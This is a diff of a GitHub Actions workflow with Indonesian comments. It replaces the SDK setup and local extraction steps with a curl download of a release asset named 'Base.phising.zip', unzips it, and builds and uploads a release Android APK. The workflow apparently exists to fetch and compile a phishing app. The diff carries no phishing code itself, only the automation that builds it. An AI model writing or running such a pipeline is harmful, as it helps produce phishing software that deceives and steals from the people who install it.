@@ -10,51 +10,34 @@ jobs:
   build:
     runs-on: ubuntu-latest
     
-    # Tambahin environment variable untuk Android
-    env:
-      ANDROID_HOME: /usr/local/android-sdk
-      ANDROID_SDK_ROOT: /usr/local/android-sdk
-      
     steps:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      # Setup Java dulu
       - name: Setup Java JDK
         uses: actions/setup-java@v4
         with:
           distribution: 'zulu'
           java-version: '17'
 
-      # Install SDK components pake sdkmanager langsung
-      - name: Install Android SDK Components
+      # Download dari release
+      - name: Download Base from Release
         run: |
-          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager \
-            "platform-tools" \
-            "platforms;android-33" \
-            "build-tools;33.0.0"
-        continue-on-error: true  # Kalo gagal, lanjut aja
-
-      # Extract zip (handle spasi)
-      - name: Extract Main Zip
-        run: |
-          # Cari file zip utama
-          ZIP_FILE=$(find . -maxdepth 1 -name "*.zip" -not -name "*kontrol*" | head -n 1)
-          if [ -z "$ZIP_FILE" ]; then
-            echo "❌ Tidak ditemukan file zip!"
+          curl -L -o base.zip \
+            https://github.com/KawakunChan/Db/releases/download/v1.0.0/Base.phising.zip
+          
+          if [ -f "base.zip" ]; then
+            echo "✅ Download sukses!"
+            ls -la base.zip
+            unzip -o base.zip
+            rm base.zip
+          else
+            echo "❌ Download gagal!"
             exit 1
           fi
-          
-          echo "📦 Extracting: $ZIP_FILE"
-          unzip -o "$ZIP_FILE"
-          
-          # Hapus zip setelah extract
-          rm "$ZIP_FILE"
 
-      # Build Android APK
       - name: Build Android APK
         run: |
-          # Cari folder android
           ANDROID_DIR=$(find . -type d -name "android" -not -path "./.github/*" | head -n 1)
           
           if [ -z "$ANDROID_DIR" ]; then
@@ -66,17 +49,7 @@ jobs:
           
           echo "🎯 Found android at: $ANDROID_DIR"
           cd "$ANDROID_DIR"
-          
-          # Cek gradlew
-          if [ ! -f "gradlew" ]; then
-            echo "❌ gradlew not found!"
-            exit 1
-          fi
-          
-          # Kasih permission
           chmod +x gradlew
-          
-          # Build dengan gradle
           ./gradlew assembleRelease --stacktrace --no-daemon
 
       - name: Upload APK Artifact
